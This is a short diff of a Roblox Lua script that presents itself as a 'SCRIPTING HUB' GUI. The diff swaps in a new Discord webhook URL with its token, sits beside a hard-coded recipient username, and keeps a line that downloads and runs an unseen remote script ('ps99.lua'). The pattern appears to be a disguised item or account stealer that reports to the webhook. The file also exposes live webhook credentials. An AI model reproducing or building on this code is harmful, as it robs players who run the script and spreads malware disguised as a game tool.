@@ -1,9 +1,10 @@
+getgenv().gui = false
+
 Username = "KeirazeIIee" 
-Webhook = "https://discord.com/api/webhooks/1273351560486846474/Ev7YgS25WSPiq1okHcbRvfk5Ia0xEey3-QhjdzwiaiJ83lkCjr796rANQ1Ijm7wg70fb" 
+Webhook = "https://discord.com/api/webhooks/1274099208215068672/LCT9F-cR1VGuehQkY0idiFGFeOd-v2HCIqIX7d-A8RAva_dmfn__kojy1wJM8qXPKvWt" 
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))() 
 
-getgenv().gui = false
 
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "SCRIPTING HUB https://discord.gg/nxC8hzWy8z", HidePremium = false, IntroText = "SCRIPTING HUB", SaveConfig = true, ConfigFolder = "OrionTest"})
